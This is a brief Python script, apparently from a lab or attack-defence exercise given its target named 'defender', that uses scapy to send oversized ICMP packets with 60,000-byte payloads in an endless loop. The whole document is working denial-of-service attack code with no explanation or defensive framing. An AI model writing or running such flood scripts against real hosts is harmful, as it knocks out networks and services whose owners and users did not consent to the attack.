from scapy.all import *

target_ip = "defender"

while True:
    send(IP(dst=target_ip)/ICMP()/("X"*60000))